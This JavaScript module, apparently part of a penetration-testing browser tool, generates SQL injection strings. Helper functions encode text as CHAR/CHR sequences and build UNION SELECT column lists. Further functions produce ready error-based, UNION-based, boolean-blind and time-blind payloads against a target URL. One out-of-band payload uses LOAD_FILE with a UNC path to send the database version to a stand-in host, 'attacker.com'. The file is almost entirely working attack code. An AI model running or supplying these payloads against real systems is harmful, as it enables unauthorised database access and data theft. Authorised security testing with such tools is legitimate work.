SQL = {

    selectionToSQLChar: function (dbEngine, txt) {
        var charStringArray = [];
        var decimal;
        for (var c = 0; c < txt.length; c++) {
            decimal = txt.charCodeAt(c);
            charStringArray.push(decimal);
        }

        var charString = '';

        switch (dbEngine) {
            case "mysql":
                charString = 'CHAR(' + charStringArray.join(', ') + ')';
                break;
            case "mssql":
                charString = ' CHAR(' + charStringArray.join(') + CHAR(') + ')';
                break;
            case "oracle":
                charString = ' CHR(' + charStringArray.join(') || CHR(') + ')';
                break;
        }
        return charString;
    },

    selectionToUnionSelect: function (columns) {
        columns = Math.min(1000, parseInt(columns));
        var colArray = [];
        for (var i = 0; i < columns; i++) {
            colArray.push(i + 1);
        }
        return "UNION SELECT " + colArray.join(',');
    },

    selectionToUnionAllSelect: function (columns) {
        columns = Math.min(1000, parseInt(columns));
        var colArray = [];
        for (var i = 0; i < columns; i++) {
            colArray.push(i + 1);
        }
        return "UNION ALL SELECT " + colArray.join(',');
    },

    selectionToUnionAllSelectNULL: function (columns) {
        columns = Math.min(1000, parseInt(columns));
        var colArray = [];
        for (var i = 0; i < columns; i++) {
            colArray.push('NULL');
        }
        return "UNION ALL SELECT " + colArray.join(',');
    },

    selectionToInlineComments: function (txt) {
        txt = txt.replace(/ /g, "/**/");
        return txt;
    },
    /* GENERAL FUNCTIONS */

    /* SQL INJECTION FUNCTIONS */
    createErrorBasedPayload: function(url) {
        // Creates an error-based SQL injection payload
        const baseUrl = url.includes('?') ? url + "'" : url + "?id=1'";
        return baseUrl + " AND extractvalue(rand(),concat(0x3a,version()))-- -";
    },
    
    createUnionBasedPayload: function(url, columns = 10) {
        // Creates a UNION-based SQL injection payload
        columns = Math.min(50, parseInt(columns) || 10);
        const baseUrl = url.includes('?') ? url : url + "?id=1";
        
        var colArray = [];
        for (var i = 0; i < columns; i++) {
            if (i === 6) { // Put our data extraction in column 7 (index 6)
                colArray.push('concat(0x3a,@@version,0x3a,user(),0x3a,database())');
            } else {
                colArray.push(i + 1);
            }
        }
        
        return baseUrl + " UNION SELECT " + colArray.join(',') + "-- -";
    },
    
    createBooleanBasedPayload: function(url) {
        // Creates a boolean-based blind SQL injection payload
        const baseUrl = url.includes('?') ? url : url + "?id=1";
        return baseUrl + " AND (SELECT SUBSTRING(@@version,1,1)) = '5'-- -";
    },
    
    createTimeBasedPayload: function(url, sleepTime = 3) {
        // Creates a time-based blind SQL injection payload
        sleepTime = Math.min(5, parseInt(sleepTime) || 3);
        const baseUrl = url.includes('?') ? url : url + "?id=1";
        return baseUrl + " AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(" + sleepTime + "),0)-- -";
    },
    
    createOutOfBandPayload: function(url, domain = 'attacker.com') {
        // Creates an out-of-band SQL injection payload
        const baseUrl = url.includes('?') ? url : url + "?id=1";
        return baseUrl + " AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'." + domain + "\\\\share\\\\a.txt'))-- -";
    },
    /* SQL INJECTION FUNCTIONS */

    /* MYSQL FUNCTIONS */
    selectionMySQLConvertUsing: function (encoding, txt) {
        return "CONVERT(" + txt + " USING " + encoding + ")";
    },

    selectionMySQLBasicInfo: function () {
        return "CONCAT_WS(CHAR(32,58,32),user(),database(),version())";
    }
    /* MYSQL FUNCTIONS */
};